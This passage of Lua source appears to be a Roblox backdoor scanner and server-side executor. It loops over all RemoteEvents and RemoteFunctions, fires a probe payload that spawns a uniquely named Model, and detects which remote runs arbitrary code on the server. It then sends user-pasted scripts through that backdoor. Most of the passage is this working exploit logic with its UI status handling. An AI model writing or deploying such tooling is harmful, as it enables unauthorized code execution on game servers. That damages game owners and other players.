local function generateName(length)
    local name = ""
    for i = 1, length do
        name = name .. alphabet[math.random(1, #alphabet)]
    end
    return name
end

local function fireBackdoor(remote, code)
    if remote:IsA("RemoteEvent") then
        remote:FireServer(code)
    elseif remote:IsA("RemoteFunction") then
        task.spawn(function()
            pcall(function()
                remote:InvokeServer(code)
            end)
        end)
    end
end

local function isValidRemote(remote)
    if not remote then return false end
    
    local name = remote.Name
    local parent = remote.Parent
    
    if name == "__FUNCTION" or remote:FindFirstChild("__FUNCTION") then
        return false
    end
    
    if parent and parent.Name == "Signals" and parent.Parent and parent.Parent.Name == "HDAdminClient" then
        return false
    end
    
    if parent and parent.Name == "DefaultChatSystemChatEvents" then
        return false
    end
    
    if remote:FindFirstAncestor("RobloxReplicatedStorage") then
        return false
    end
    
    return true
end

local function scanBackdoor()
    if isScanning then return end
    isScanning = true
    
    StatusLabel.Text = "Status: Scanning for backdoor..."
    StatusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
    InjectBtn.Text = "Scanning..."
    
    local testCodes = {}
    local remotes = {}
    
    for _, obj in pairs(game:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and isValidRemote(obj) then
            local code
            repeat
                code = generateName(15)
            until not testCodes[code]
            
            testCodes[code] = obj
            table.insert(remotes, {remote = obj, code = code})
        end
    end
    
    if #remotes == 0 then
        StatusLabel.Text = "Status: No remotes found"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        InjectBtn.Text = "Inject (Scan)"
        isScanning = false
        notify("No remotes found to test", false)
        return false
    end
    
    for _, data in pairs(remotes) do
        local payload = "local m=Instance.new('Model',workspace)m.Name='" .. data.code .. "'"
        fireBackdoor(data.remote, payload)
    end
    
    local found = false
    local startTime = tick()
    
    while tick() - startTime < 3 do
        for code, remote in pairs(testCodes) do
            if workspace:FindFirstChild(code) then
                backdoorRemote = remote
                found = true
                
                pcall(function()
                    workspace[code]:Destroy()
                end)
                
                break
            end
        end
        
        if found then break end
        task.wait(0.1)
    end
    
    for code, _ in pairs(testCodes) do
        local obj = workspace:FindFirstChild(code)
        if obj then
            pcall(function() obj:Destroy() end)
        end
    end
    
    isScanning = false
    InjectBtn.Text = "Inject (Scan)"
    
    if found then
        StatusLabel.Text = "Status: Injected! Remote: " .. backdoorRemote.Name
        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        notify("Injected successfully!", true)
        return true
    else
        StatusLabel.Text = "Status: No backdoor found"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        notify("Injection failed :(", false)
        return false
    end
end

local function executeScript()
    local code = TextBox.Text
    
    if code == "" or code == "-- Paste your script here" then
        notify("Please enter code to execute", false)
        return
    end
    
    if not backdoorRemote then
        notify("Please inject first!", false)
        StatusLabel.Text = "Status: Not injected!"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    code = code:gsub("%%username%%", player.Name)
    
    local success, err = pcall(function()
        fireBackdoor(backdoorRemote, code)
    end)
    
    if success then
        notify("Executed!", true)
        StatusLabel.Text = "Status: Executed successfully"
        StatusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    else
        notify("Execution failed: " .. tostring(err):sub(1, 50), false)
        StatusLabel.Text = "Status: Execution failed"
        StatusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
    end
end

